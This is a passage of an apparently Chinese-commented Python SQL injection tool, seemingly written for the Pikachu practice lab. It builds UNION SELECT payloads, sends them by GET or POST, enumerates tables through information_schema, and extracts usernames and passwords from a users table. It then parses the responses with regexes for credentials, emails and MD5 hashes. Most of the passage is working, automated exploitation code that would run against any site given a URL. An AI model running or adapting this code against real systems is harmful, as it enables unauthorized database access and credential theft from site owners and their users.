                            r'(mysql|postgresql|sqlite|oracle|mssql|sql server)\s+(?:version\s*[=:]?)?\s*([0-9.]+(?:\-[\w]+)?)?',
                            # 数字版本号（如 5.7.26）
                            r'\b([0-9]+\.[0-9]+\.[0-9]+(?:\-[\w]+)?)\b',
                        ]
                        
                        # 遍历所有新增内容
                        for added_content in res['added']:
                            for pattern in patterns:
                                matches = re.findall(pattern, added_content, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if isinstance(match, tuple):
                                            # 组合元组中的内容
                                            match_str = ' | '.join(m.strip() for m in match if m.strip())
                                        else:
                                            match_str = match.strip()
                                        
                                        # 验证匹配结果是否看起来像数据库信息
                                        if (any(char.isdigit() for char in match_str) or 
                                            len(match_str) > 3 or 
                                            any(keyword in match_str.lower() for keyword in ['mysql', 'postgresql', 'sqlite'])):
                                            self.print(f"[+] 数据库信息 (通用模式): {match_str}")
                                            database_info_found = True
                                            break
                                    if database_info_found:
                                        break
                                if database_info_found:
                                    break
                            if database_info_found:
                                break
                
                # 3. 最后尝试启发式提取
                if not database_info_found and res['added']:
                    self.print("[*] 使用启发式方法提取数据库信息...")
                    for added_content in res['added']:
                        # 检查是否包含数据库相关关键词
                        if any(keyword in added_content.lower() for keyword in ['database', 'version', 'schema']):
                            self.print(f"[+] 数据库相关信息: {added_content}")
                            database_info_found = True
                            break
                        # 检查是否包含版本号格式
                        version_match = re.search(r'\b[0-9]+\.[0-9]+\.[0-9]+\b', added_content)
                        if version_match and len(added_content) < 100:
                            self.print(f"[+] 可能的版本信息: {added_content}")
                            database_info_found = True
                            break
                
                if not database_info_found:
                    self.print("[-] 无法提取数据库信息")

    def extract_tables(self, url, method, param, data_template, closing_pattern, column_count, output_info=None):
        """提取数据库表信息，支持动态适配不同网站的输出格式"""
        self.print("[*] 提取数据库表信息...")
        select_parts = []
        for i in range(1, column_count):
            select_parts.append(str(i))
        union_select = ",".join(select_parts)

        standard_input = {
            "numeric": "1",
            "string": "vince",
            "search": "vince",
            "xx": "1",
        }
        patterns = {
            "numeric": r'hello,(.*?)\s*your email is:\s*(.*?)(?=hello,|\Z)',
            "string": r'your uid:(.*?)\s*your email is:\s*(.*?)(?=your uid:|\Z)',
            "search": r'username：\s*(.*?)uid:(.*?)email is:\s*(.*?)(?=username：|\Z)',
            "xx": r'your uid:(.*?)\s*your email is:\s*(.*?)(?=your uid:|\Z)',
        }
        
        # 构造查询payload
        if closing_pattern == "string":
            payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
        elif closing_pattern == "search":
            payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
        elif closing_pattern == "xx":
            payload = f"1') union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
        else:
            payload = f"1 union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database()"
        
        # 发送请求
        if method == 'GET':
            response = self.send_request(url, params={param: payload, 'submit': '查询'})
            standard_response = self.send_request(url, params={param: standard_input[f'{closing_pattern}'], 'submit': '查询'})
        else:
            data = data_template.copy() if data_template else {}
            data[param] = payload
            response = self.send_request(url, method='POST', data=data)
            standard_data = data_template.copy() if data_template else {}
            standard_data[param] = standard_input[f'{closing_pattern}']
            standard_response = self.send_request(url, method='POST', data=standard_data)
        
        if response and standard_response:
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            standard_soup = BeautifulSoup(standard_response.text, 'html.parser')
            standard_text = standard_soup.get_text()
            res = extract_page_changes(standard_text, text, scanner=self)
            
            # 优先使用动态生成的正则表达式
            tables_found = False
            tables = []
            
            # 1. 使用动态生成的正则表达式提取
            if output_info and 'output_positions' in output_info:
                self.print("[*] 使用动态生成的正则表达式提取表信息...")
                for pattern in output_info['output_positions']:
                    # 查找所有新增内容中的匹配
                    for added_content in res['added']:
                        matches = re.findall(pattern, added_content)
                        for match in matches:
                            # 处理匹配结果
                            if isinstance(match, tuple):
                                # 检查元组中的每个部分
                                for m in match:
                                    if m and (',' in m or any(keyword in m.lower() for keyword in ['users', 'admin', 'products'])):
                                        tables.extend([t.strip() for t in re.split(r'[,;|]', m) if t.strip()])
                                        tables_found = True
                            else:
                                # 提取表名（通常是逗号分隔的多个表名）
                                if match and (',' in match or any(keyword in match.lower() for keyword in ['users', 'admin', 'products'])):
                                    tables.extend([t.strip() for t in re.split(r'[,;|]', match) if t.strip()])
                                    tables_found = True
                            if tables_found:
                                break
                        if tables_found:
                            break
                    if tables_found:
                        break
            
            # 2. 使用基于特征的模式识别
            if not tables_found and 'features' in res and res['features']:
                self.print("[*] 使用基于特征的模式识别提取表信息...")
                
                # 基于识别到的分隔符构建模式
                if 'separators' in res['features'] and res['features']['separators']:
                    for sep in res['features']['separators']:
                        escaped_sep = re.escape(sep)
                        # 构建针对表名的模式
                        patterns = [
                            r'{}([a-zA-Z_][a-zA-Z0-9_]*){}'.format(escaped_sep, escaped_sep),
                            r'^{}([a-zA-Z_][a-zA-Z0-9_]*)'.format(escaped_sep),
                            r'([a-zA-Z_][a-zA-Z0-9_]*){}$'.format(escaped_sep)
                        ]
                        
                        for pattern in patterns:
                            for added_content in res['added']:
                                matches = re.findall(pattern, added_content)
                                tables.extend([match.strip() for match in matches if len(match.strip()) >= 3])
                                if tables:
                                    tables_found = True
                        if tables_found:
                            break
            
            # 3. 使用默认模式
            if not tables_found:
                self.print("[*] 使用默认模式提取表信息...")
                try:
                    pattern = patterns[f'{closing_pattern}']
                    
                    # 使用findall方法查找所有匹配项
                    matches = []
                    for _ in res['added']:
                        matches += re.findall(pattern, _)
                    
                    # 处理并打印结果
                    if matches:
                        for match in matches:
                            if isinstance(match, tuple):
                                for m in match:
                                    if m and len(m.strip()) > 0:
                                        tables.extend([t.strip() for t in re.split(r'[,;|]', m.strip()) if t.strip()])
                            else:
                                tables.extend([t.strip() for t in re.split(r'[,;|]', match.strip()) if t.strip()])
                        tables_found = True
                except Exception:
                    self.print("[*] 默认模式匹配失败，尝试其他方法...")
            
            # 4. 尝试直接在页面文本中查找表名
            if not tables_found:
                self.print("[*] 尝试直接在页面文本中查找表名...")
                
                # 增强的表名匹配模式
                table_patterns = [
                    # 常见表名
                    r'(?:users?|emails?|members?|admin(?:s|_users)?|accounts?|products?|posts?|categories?|orders?|logs?|sessions?)(?=[,;\s|]|$)',
                    # 字母数字下划线组成的可能表名
                    r'\b([a-zA-Z_][a-zA-Z0-9_]{2,49})\b',
                    # 逗号分隔的表名列表
                    r'(?:\b[a-zA-Z_][a-zA-Z0-9_]*\b)(?:[,;|]\s*\b[a-zA-Z_][a-zA-Z0-9_]*\b)+',
                ]
                
                for pattern in table_patterns:
                    potential_tables = re.findall(pattern, text, re.IGNORECASE)
                    if potential_tables:
                        if isinstance(potential_tables[0], tuple):
                            # 处理元组结果
                            for match in potential_tables:
                                tables.extend([t for t in match if t.strip()])
                        else:
                            # 直接添加结果
                            tables.extend([t for t in potential_tables if t.strip()])
                        tables_found = True
                        break
                
                # 特别检查重要变化中的内容
                if 'important_changes' in res and res['important_changes']:
                    for change in res['important_changes']:
                        # 在重要变化中查找可能的表名
                        for pattern in table_patterns:
                            potential_tables = re.findall(pattern, change, re.IGNORECASE)
                            if potential_tables:
                                if isinstance(potential_tables[0], tuple):
                                    for match in potential_tables:
                                        tables.extend([t for t in match if t.strip()])
                                else:
                                    tables.extend([t for t in potential_tables if t.strip()])
                                tables_found = True
            
            # 5. 应用启发式过滤和排序
            if tables:
                # 常见的非表名关键词
                exclude_keywords = {
                    'select', 'from', 'where', 'union', 'table', 'schema', 'information', 'name', 
                    'column', 'row', 'sql', 'database', 'version', 'user', 'admin', 'password',
                    'login', 'test', 'true', 'false', 'null', 'values', 'insert', 'update', 'delete',
                    'create', 'drop', 'alter', 'index', 'primary', 'key', 'foreign', 'unique'
                }
                
                # 常见的表名关键词（用于提高优先级）
                table_keywords = {
                    'users', 'admin', 'products', 'login', 'members', 'customers', 'posts', 
                    'articles', 'messages', 'categories', 'orders', 'payment', 'transaction',
                    'accounts', 'staff', 'clients', 'items', 'logs', 'sessions',
                    'pages', 'settings', 'config', 'profiles', 'permissions', 'roles'
                }
                
                # 过滤和评分
                scored_tables = []
                for table in tables:
                    table_lower = table.lower()
                    
                    # 过滤掉非表名关键词
                    if table_lower in exclude_keywords:
                        continue
                    
                    # 确保表名符合命名规范
                    if not re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', table) or len(table) > 50 or len(table) < 2:
                        continue
                    
                    # 计算表名分数
                    score = 1
                    if table_lower in table_keywords:
                        score += 10  # 常见表名关键词加高分
                    elif any(keyword in table_lower for keyword in ['user', 'admin', 'log', 'order', 'product']):
                        score += 5   # 包含常见表名字段的加中等分数
                    
                    scored_tables.append((table, score))
                
                # 按分数排序，相同分数的按字母顺序
                scored_tables.sort(key=lambda x: (-x[1], x[0]))
                
                # 去重，保留第一个出现的（通常是分数最高的）
                final_tables = []
                seen = set()
                for table, _ in scored_tables:
                    if table.lower() not in seen:
                        seen.add(table.lower())
                        final_tables.append(table)
                
                if final_tables:
                    self.print(f"所有数据库表名：")
                    for table in final_tables:
                        self.print(table)
                    return final_tables
                else:
                    # 如果过滤后没有有效表名，返回原始表名（可能包含噪声），但做基本清理
                    cleaned_tables = [t for t in tables if t.strip() and len(t.strip()) > 1]
                    if cleaned_tables:
                        self.print(f"所有可能的数据库表名：")
                        for table in list(set(cleaned_tables))[:20]:  # 去重并限制数量
                            self.print(table)
                        return list(set(cleaned_tables))[:20]
            
            self.print("未找到匹配的表名。")
        return None

    def extract_user_data(self, url, method, param, data_template, closing_pattern, column_count, output_info=None):
        """提取用户数据，支持动态适配不同网站的输出格式"""
        self.print("[*] 提取用户数据...")
        standard_input = {
            "string": "vince",
            "search": "a",
            "xx": "1",
            "numeric": "1",
        }
        patterns = {
            "numeric": r'hello,(.*?)\s*your email is:\s*(.*?)(?=hello,|\Z)',
            "string": r'your uid:(.*?)\s*your email is:\s*(.*?)(?=your uid:|\Z)',
            "search": r'username：\s*(.*?)uid:(.*?)email is:\s*(.*?)(?=username：|\Z)',
            "xx": r'your uid:(.*?)\s*your email is:\s*(.*?)(?=your uid:|\Z)',
        }
        
        # 动态构造payload，考虑不同的列数
        if closing_pattern == "string":
            if column_count >= 2:
                payload = f"vince' union select username,password from users # "
            else:
                payload = f"vince' union select username from users # "
        elif closing_pattern == "search":
            if column_count >= 3:
                payload = f"vince' union select 1,username,password from users # "
            elif column_count >= 2:
                payload = f"vince' union select username,password from users # "
            else:
                payload = f"vince' union select username from users # "
        elif closing_pattern == "xx":
            if column_count >= 2:
                payload = f"1') union select username,password from users # "
            else:
                payload = f"1') union select username from users # "
        else:
            if column_count >= 2:
                payload = f"1 union select username,password from users"
            else:
                payload = f"1 union select username from users"
        
        # 发送请求
        if method == 'GET':
            response = self.send_request(url, params={param: payload, 'submit': '查询'})
            standard_response = self.send_request(url, params={param: standard_input[f'{closing_pattern}'], 'submit': '查询'})
        else:
            data = data_template.copy() if data_template else {}
            data[param] = payload
            response = self.send_request(url, method='POST', data=data)
            standard_data = data_template.copy() if data_template else {}
            standard_data[param] = standard_input[f'{closing_pattern}']
            standard_response = self.send_request(url, method='POST', data=standard_data)
        
        if response and standard_response:
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            standard_soup = BeautifulSoup(standard_response.text, 'html.parser')
            standard_text = standard_soup.get_text()
            res = extract_page_changes(standard_text, text, scanner=self)
            
            # 优先使用动态生成的正则表达式
            user_data_found = False
            user_records = []
            
            # 1. 使用动态生成的正则表达式提取
            if output_info and 'output_positions' in output_info:
                self.print("[*] 使用动态生成的正则表达式提取用户数据...")
                # 查找所有可能包含用户数据的匹配
                all_matches = []
                
                for pattern in output_info['output_positions']:
                    # 查找新增内容中的匹配
                    for added_content in res['added']:
                        matches = re.findall(pattern, added_content)
                        all_matches.extend(matches)
                
                # 分析匹配结果，尝试识别用户名和密码
                if all_matches:
                    self.print("\n找到的用户数据 (动态匹配):")
                    for i, match in enumerate(all_matches, 1):
                        record = {}
                        if isinstance(match, tuple):
                            # 尝试根据字段内容识别其类型
                            for j, field in enumerate(match):
                                field_str = field.strip()
                                if field_str:
                                    # 保存原始字段
                                    record[f'field_{j}'] = field_str
                                    # 尝试识别字段类型
                                    if self._is_potential_password(field_str):
                                        record['password'] = field_str
                                    elif self._is_potential_username(field_str):
                                        record['username'] = field_str
                                    elif self._is_potential_email(field_str):
                                        record['email'] = field_str
                                    elif self._is_potential_uid(field_str):
                                        record['uid'] = field_str
                                
                                self.print(f"记录 {i}, 字段 {j}: {field_str}")
                        else:
                            field_str = match.strip()
                            if field_str:
                                record['data'] = field_str
                                self.print(f"记录 {i}: {field_str}")
                        
                        if record:
                            user_records.append(record)
                    user_data_found = True
            
            # 2. 使用基于特征的模式识别
            if not user_data_found and 'features' in res and res['features']:
                self.print("[*] 使用基于特征的模式识别提取用户数据...")
                
                # 基于识别到的分隔符构建模式
                if 'separators' in res['features'] and res['features']['separators']:
                    for sep in res['features']['separators']:
                        escaped_sep = re.escape(sep)
                        # 构建针对用户数据的模式
                        user_patterns = [
                            # 用户名和密码组合
                            r'{}([^\\{}]+){}'.format(escaped_sep, escaped_sep, escaped_sep) * 2,
                            # 单个字段模式
                            r'^{}([^\\{}]+)'.format(escaped_sep, escaped_sep),
                            r'([^\\{}]+){}$'.format(escaped_sep, escaped_sep)
                        ]
                        
                        for pattern in user_patterns:
                            for added_content in res['added']:
                                matches = re.findall(pattern, added_content)
                                if matches:
                                    for i, match in enumerate(matches, 1):
                                        if isinstance(match, tuple):
                                            for j, field in enumerate(match):
                                                if field.strip():
                                                    self.print(f"潜在用户数据 {i}-{j}: {field.strip()}")
                                                    user_data_found = True
                                        else:
                                            if match.strip():
                                                self.print(f"潜在用户数据 {i}: {match.strip()}")
                                                user_data_found = True
                            if user_data_found:
                                break
                        if user_data_found:
                            break
            
            # 3. 使用默认模式
            if not user_data_found:
                self.print("[*] 使用默认模式提取用户数据...")
                try:
                    pattern = patterns[f'{closing_pattern}']
                    
                    # 查找所有匹配项
                    matches = []
                    for _ in res['added']:
                        matches += re.findall(pattern, _)
                    
                    # 处理匹配结果
                    if matches:
                        self.print("\n找到的用户数据 (默认模式):")
                        for i, match in enumerate(matches, 1):
                            record = {}
                            if isinstance(match, tuple):
                                for j, field in enumerate(match):
                                    field_str = field.strip()
                                    if field_str:
                                        # 尝试根据位置和内容识别字段类型
                                        if j == 0 and self._is_potential_username(field_str):
                                            record['username'] = field_str
                                            self.print(f"记录 {i}, 用户名: {field_str}")
                                        elif j == 1 and self._is_potential_password(field_str):
                                            record['password'] = field_str
                                            self.print(f"记录 {i}, 密码: {field_str}")
                                        elif self._is_potential_email(field_str):
                                            record['email'] = field_str
                                            self.print(f"记录 {i}, 邮箱: {field_str}")
                                        elif self._is_potential_uid(field_str):
                                            record['uid'] = field_str
                                            self.print(f"记录 {i}, ID: {field_str}")
                                        else:
                                            self.print(f"记录 {i}, 字段 {j}: {field_str}")
                                        record[f'field_{j}'] = field_str
                            
                            if record:
                                user_records.append(record)
                        user_data_found = True
                except Exception:
                    self.print("[*] 默认模式匹配失败，尝试高级用户数据提取...")
            
            # 4. 增强的用户数据提取
            if not user_data_found:
                self.print("[*] 使用增强模式直接在页面中查找用户数据...")
                
                # 增强的用户信息模式列表
                user_info_patterns = [
                    # uid 信息的多种格式
                    r'(?:uid|id|userid|编号)\s*[:=]?\s*(\w+)',
                    r'(your\s+uid\s*is?\s*:?\s*(\w+))',
                    
                    # email 信息的多种格式
                    r'(?:email|邮箱)\s*[:=]?\s*([\w.-]+@[\w.-]+\.\w+)',
                    r'(your\s+email\s+is?\s*:?\s*([\w.-]+@[\w.-]+\.\w+))',
                    
                    # 用户名信息的多种格式
                    r'(?:username|user|用户名|账户)\s*[:=]?\s*([^\s,]+)',
                    r'(username\s*:?\s*(\w+))',
                    
                    # 密码信息的多种格式
                    r'(?:password|pass|pwd|密码)\s*[:=]?\s*([^\s,]+)',
                    r'(password\s*is?\s*:?\s*([^\s,]+))',
                    
                    # key=value 格式，更灵活
                    r'(\w+)\s*[=:]\s*([^\s,]+)',
                    
                    # ID:数字格式，更灵活
                    r'(id|uid)\s*[:=]\s*(\d+)',
                    
                    # MD5密码格式
                    r'(\w+)\s*[:=]\s*([a-f0-9]{32})',
                    
                    # 常见的用户名密码组合
                    r'(?:admin|root|test|user)\s*[:=]\s*([^\s,]+)',
                    
                    # 连续的用户信息块
                    r'(\w+)\s+([^\s]+)\s+([^\s]+)',
                ]
                
                # 首先检查重要变化
                if 'important_changes' in res and res['important_changes']:
                    for change in res['important_changes']:
                        for pattern in user_info_patterns:
                            user_matches = re.findall(pattern, change, re.IGNORECASE)
                            if user_matches:
                                self.print(f"\n从重要变化中找到的用户数据:")
                                for user_match in user_matches:
                                    if isinstance(user_match, tuple):
                                        # 尝试识别元组中的字段类型
                                        for i, field in enumerate(user_match):
                                            field_str = field.strip()
                                            if field_str:
                                                if self._is_potential_password(field_str):
                                                    self.print(f"密码: {field_str}")
                                                elif self._is_potential_email(field_str):
                                                    self.print(f"邮箱: {field_str}")
                                                elif self._is_potential_username(field_str):
                                                    self.print(f"用户名: {field_str}")
                                                elif self._is_potential_uid(field_str):
                                                    self.print(f"ID: {field_str}")
                                                else:
                                                    self.print(f"字段 {i}: {field_str}")
                                    else:
                                        self.print(f"用户数据: {user_match}")
                                user_data_found = True
                                break
                        if user_data_found:
                            break
                
                # 如果重要变化中没有找到，检查所有新增内容
                if not user_data_found:
                    for added_content in res['added']:
                        for pattern in user_info_patterns:
                            user_matches = re.findall(pattern, added_content, re.IGNORECASE)
                            if user_matches:
                                found_data = False
                                for user_match in user_matches:
                                    if isinstance(user_match, tuple):
                                        # 过滤掉单个字符或明显不是用户数据的内容
                                        valid_fields = [f.strip() for f in user_match if f.strip() and len(f.strip()) > 1]
                                        if len(valid_fields) > 0:
                                            if not found_data:
                                                self.print("\n找到的用户数据 (增强模式):")
                                                found_data = True
                                            
                                            # 尝试识别字段类型
                                            for field in valid_fields:
                                                if self._is_potential_password(field):
                                                    self.print(f"密码: {field}")
                                                elif self._is_potential_email(field):
                                                    self.print(f"邮箱: {field}")
                                                elif self._is_potential_username(field):
                                                    self.print(f"用户名: {field}")
                                                elif self._is_potential_uid(field):
                                                    self.print(f"ID: {field}")
                                                else:
                                                    self.print(f"数据: {field}")
                                    else:
                                        field_str = user_match.strip()
                                        if field_str and len(field_str) > 1:
                                            if not found_data:
                                                self.print("\n找到的用户数据 (增强模式):")
                                                found_data = True
                                            self.print(f"用户数据: {field_str}")
                                
                                if found_data:
                                    user_data_found = True
                                    break
                        if user_data_found:
                            break
            
            # 5. 最后尝试启发式提取
            if not user_data_found:
                self.print("[*] 使用启发式方法提取可能的用户数据...")
                
                # 启发式查找包含用户数据特征的内容
                user_keywords = ['user', 'admin', 'password', 'pass', 'pwd', 'email', 'mail', 'login', 'id', 'uid']
                
                for added_content in res['added']:
                    # 检查是否包含多个用户关键词
                    keyword_count = sum(1 for keyword in user_keywords if keyword.lower() in added_content.lower())
                    
                    # 检查是否包含看起来像密码的内容（MD5或包含特殊字符）
                    password_like = re.search(r'[a-f0-9]{32}|[A-F0-9]{32}|\w{8,}', added_content)
                    
                    # 检查是否包含看起来像用户名的内容
                    username_like = re.search(r'\b[a-zA-Z_][a-zA-Z0-9_]{2,20}\b', added_content)
                    
                    # 如果内容看起来包含用户数据
                    if (keyword_count >= 2) or (password_like and username_like) or len(added_content.strip()) > 10:
                        # 检查是否包含至少一个看起来有效的字段
                        potential_fields = re.findall(r'\b\w{3,}\b', added_content)
                        valid_fields = [f for f in potential_fields if len(f) >= 3 and not f.lower() in ['select', 'from', 'where', 'union', 'table']]
                        
                        if len(valid_fields) >= 2:
                            self.print(f"\n可能的用户数据块:")
                            self.print(f"{added_content.strip()}")
                            user_data_found = True
                            break
            
            if not user_data_found:
                self.print("[-] 无法提取用户数据")
        
    def _is_potential_password(self, text):
        """检查文本是否可能是密码"""
        # MD5 哈希
        if re.match(r'^[a-f0-9]{32}$', text) or re.match(r'^[A-F0-9]{32}$', text):
            return True
        # 包含特殊字符的字符串
        if re.search(r'[!@#$%^&*(),.?":{}|<>]', text) and len(text) >= 6:
            return True
        # 纯数字字符串（可能是简单密码）
        if text.isdigit() and len(text) >= 4:
            return True
        # 长度较长的字符串
        if len(text) >= 8 and not ' ' in text:
            return True
        return False
    
    def _is_potential_username(self, text):
        """检查文本是否可能是用户名"""
        # 常见用户名格式
        if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]{2,20}$', text):
            return True
        # 常见的用户名关键词
        common_usernames = {'admin', 'root', 'test', 'user', 'guest', 'demo'}
        if text.lower() in common_usernames:
            return True
        return False
    
    def _is_potential_email(self, text):
        """检查文本是否可能是邮箱地址"""
        # 简单的邮箱格式匹配
        email_pattern = r'^[\w.-]+@[\w.-]+\.\w+$'
        if re.match(email_pattern, text):
            return True
        return False
    
    def _is_potential_uid(self, text):
        """检查文本是否可能是用户ID"""
        # 纯数字ID
        if text.isdigit() and len(text) <= 10:
            return True
        # ID 格式如 u123, id123
        if re.match(r'^(u|id)[0-9]{1,10}$', text, re.IGNORECASE):
            return True
        return False

# 辅助函数
def extract_page_changes(text_a, text_b, scanner=None, output_file=None):
    """
    比较两个BeautifulSoup文本的差异，提取网页的实际输出变化，支持动态适配不同网站的输出格式
    
    参数:
        text_a: 第一个soup.get_text()结果
        text_b: 第二个soup.get_text()结果  
        scanner: 扫描器实例，用于调用回调函数
        output_file: 可选，将结果保存到文件
    
    返回:
        dict: 包含差异详细信息的字典
    """
    import re
    from collections import Counter
    
    # 增强的动态特征分析函数
    def analyze_text_features(text):
        """分析文本特征，返回可能的分隔符、模式和结构
        增强功能：自适应分隔符检测、多级别模式识别、结构分析
        """
        # 识别可能的分隔符 - 结合模式匹配和频率分析
        separators = []
        separator_analysis = []
        
        # 1. 基于模式的分隔符检测
        separator_patterns = [
            r'[\|\,\;\:\-\=\+\#\&\/]{2,}',  # 重复的标点符号作为分隔符
            r'\s{3,}',  # 多个空格
            r'[\n\r]{2,}',  # 多个换行
            r'\t+',  # 制表符
            r'\x09+',  # 制表符
            r'[\[\]\{\}\(\)]{2,}',  # 括号作为分隔符
        ]
        
        for pattern in separator_patterns:
            matches = re.findall(pattern, text)
            if matches:
                # 找出最常见的分隔符
                common_sep = Counter(matches).most_common(1)[0][0]
                # 计算分隔符的分布和频率
                frequency = text.count(common_sep)
                density = frequency / max(len(text.splitlines()), 1)
                separator_analysis.append((common_sep, frequency, density, 'pattern'))
        
        # 2. 基于字符的直接分隔符检测
        common_separators = ['|', ',', ';', '\t', '  ', ':', '=', '=>', '->', '#', '&', '/', '*']
        for sep in common_separators:
            if sep in text and text.count(sep) > 3:  # 至少出现4次
                frequency = text.count(sep)
                density = frequency / max(len(text.splitlines()), 1)
                separator_analysis.append((sep, frequency, density, 'char'))
        
        # 3. 排序并选择最佳分隔符
        separator_analysis.sort(key=lambda x: (x[1] * x[2]), reverse=True)
        # 选择前5个，并且去重
        seen = set()
        for sep, _, _, _ in separator_analysis:
            if sep not in seen:
                separators.append(sep)
                seen.add(sep)
                if len(separators) >= 5:
                    break
        
        # 识别文本模式特征 - 多级分类系统
        patterns = []
        
        # 1. 数据类型模式
        if re.search(r'\w+[\s=:]+[\w\d@.]+', text):
            patterns.append('key_value')
        # 2. 哈希和标识符模式
        if re.search(r'\b[0-9a-f]{32}\b', text, re.IGNORECASE):
            patterns.append('hashes_md5')
        if re.search(r'\b[0-9a-f]{40}\b', text, re.IGNORECASE):
            patterns.append('hashes_sha1')
        if re.search(r'\b[0-9a-f]{64}\b', text, re.IGNORECASE):
            patterns.append('hashes_sha256')
        if re.search(r'\b[A-Za-z0-9_]{36}\b', text):
            patterns.append('uuid')
        # 3. 邮箱和用户名模式
        if re.search(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}', text):
            patterns.append('emails')
        if re.search(r'\b[A-Za-z][A-Za-z0-9_]{3,}\b', text):
            patterns.append('usernames')
        # 4. 数字模式
        if re.search(r'\b\d{4,}\b', text):
            patterns.append('long_numbers')
        if re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', text):
            patterns.append('ip_addresses')
        # 5. 结构化数据模式
        if re.search(r'\[.*?\]', text) or re.search(r'\{.*?\}', text):
            patterns.append('structured_data')
        if re.search(r'<[^>]+>', text):
            patterns.append('html_like')
        # 6. 键值对检测，支持多种格式
        if re.search(r'\w+\s*[:=]\s*[\w\d@.]+', text):
            patterns.append('key_value_pairs')
        if re.search(r'\w+\s*=>\s*[\w\d@.]+', text):
            patterns.append('arrow_pairs')
        # 7. 数据库相关模式
        if re.search(r'\b(table|column|database|schema)\b', text, re.IGNORECASE):
            patterns.append('database_terms')
        if re.search(r'\binformation_schema\b', text, re.IGNORECASE):
            patterns.append('information_schema')
        # 8. 特定格式检测
        if re.search(r'[A-Za-z0-9+/=]{8,}', text):
            patterns.append('base64_like')
        
        # 执行动态结构分析
        structure_type = detect_text_structure(text)
        if structure_type:
            patterns.append(structure_type)
        
        return separators, patterns
    
    # 辅助函数：检测文本的整体结构类型
    def detect_text_structure(text):
        # 检查CSV/表格结构
        if re.search(r'([\w\s]+[\|\,\t]){3,}[\w\s]+', text):
            return 'table_like'
        # 检查键值对结构
        if re.search(r'\w+[\s=:]+[\w\d@.]+\n\w+[\s=:]+[\w\d@.]+', text):
            return 'key_value_blocks'
        # 检查列表结构
        if re.search(r'[\n\r][\-*+]\s+\w+', text):
            return 'list_like'
        # 检查代码块
        if re.search(r'\b(def|class|function)\b', text, re.IGNORECASE):
            return 'code_like'
        return None
    
    # 辅助函数：计算文本复杂性
    def calculate_text_complexity(text):
        """计算文本的复杂性，返回0-1之间的值"""
        if not text:
            return 0
        
        complexity = 0
        factors = 0
        
        # 字符类型多样性 (0-0.2)
        has_uppercase = any(c.isupper() for c in text)
        has_lowercase = any(c.islower() for c in text)
        has_digit = any(c.isdigit() for c in text)
        has_special = any(not c.isalnum() and not c.isspace() for c in text)
        char_diversity = (has_uppercase + has_lowercase + has_digit + has_special) / 4
        complexity += char_diversity * 0.2
        factors += 0.2
        
        # 特殊字符密度 (0-0.2)
        special_chars = sum(1 for c in text if not c.isalnum() and not c.isspace())
        special_density = min(special_chars / len(text), 1.0)
        complexity += special_density * 0.2
        factors += 0.2
        
        # 分隔符使用 (0-0.2)
        separator_chars = sum(1 for c in text if c in '|,;:\t =+&')
        separator_density = min(separator_chars / max(len(text), 1), 1.0)
        complexity += separator_density * 0.2
        factors += 0.2
        
        # 词汇多样性 (0-0.2)
        words = re.findall(r'\w+', text)
        if words:
            unique_words = len(set(words))
            word_diversity = min(unique_words / len(words), 1.0)
            complexity += word_diversity * 0.2
            factors += 0.2
        
        # 结构特征 (0-0.2)
        structure_score = 0
        if re.search(r'\w+[\s=:]+[\w\d@.]+', text):
            structure_score += 0.5
        if re.search(r'[\[\]\{\}\(\)]', text):
            structure_score += 0.5
        complexity += structure_score * 0.2
        factors += 0.2
        
        # 归一化结果
        if factors > 0:
            return min(complexity / factors, 1.0)
        return 0
    
    # 预处理文本：按行分割并清理空行
    lines_a = [line.strip() for line in text_a.splitlines() if line.strip()]
    lines_b = [line.strip() for line in text_b.splitlines() if line.strip()]
    
    # 分析两个文本的特征，找出可能的分隔符和模式
    separators_a, patterns_a = analyze_text_features(text_a)
    separators_b, patterns_b = analyze_text_features(text_b)
    
    # 合并特征信息，关注新增的特征
    all_separators = list(set(separators_a + separators_b))
    new_patterns = [p for p in patterns_b if p not in patterns_a]
    
    # 使用difflib进行精确比较
    differ = difflib.Differ()
    diff_result = list(differ.compare(lines_a, lines_b))
    
    # 提取差异信息
    changes = {
        'added': [],      # B中新增的内容
        'removed': [],    # A中有但B中删除的内容  
        'modified': [],   # 修改的内容
        'all_changes': [], # 所有变化行
        'change_ratio': 0,  # 变化比例
        'features': {'separators': all_separators, 'new_patterns': new_patterns}  # 特征信息
    }
    
    # 计算变化比例
    total_lines = max(len(lines_a), len(lines_b), 1)
    added_count = 0
    removed_count = 0
    
    # 分析差异结果
    for line in diff_result:
        if line.startswith('+ '):
            # B中新增的行
            change = line[2:].strip()
            changes['added'].append(change)
            changes['all_changes'].append(('added', change))
            added_count += 1
        elif line.startswith('- '):
            # A中有但B中删除的行
            change = line[2:].strip()
            changes['removed'].append(change)
            changes['all_changes'].append(('removed', change))
            removed_count += 1
        elif line.startswith('? '):
            # 修改标记（在+或-之后出现）
            pass
        elif line.startswith('  '):
            # 未变化的内容
            pass
    
    # 计算变化比例
    changes['change_ratio'] = (added_count + removed_count) / total_lines
    
    # 如果有重要变化且提供了scanner实例，调用回调函数
    if scanner and scanner.changes_callback and changes.get('added'):
        # 检查是否有真正有意义的变化，使用动态特征分析优化过滤规则
        significant_changes = []
        
        # 增强的关键词列表，按类别分组
        keywords = {
            'user_data': ['admin', 'user', 'pass', 'pwd', 'password', 'username', 'uid', 'email', 'login', 'session'],
            'database': ['database', 'table', 'column', 'schema', 'information_schema', 'mysql', 'postgresql', 'sqlite'],
            'system': ['version', 'server', 'os', 'linux', 'windows', 'ubuntu', 'centos'],
            'error': ['error', 'exception', 'warning', 'notice', 'failed', 'success', 'invalid', 'valid'],
            'sensitive': ['key', 'token', 'secret', 'hash', 'md5', 'sha', 'authorization', 'auth']
        }
        
        # 动态生成忽略列表，但确保不会忽略包含敏感信息的内容
        ignore_patterns = ['pikachu', '登录', '注册', '退出', '首页', 'welcome', 'home', 'logout', 'login']
        
        # 动态识别和提取重要变化 - 增强版
        for change in changes['added']:
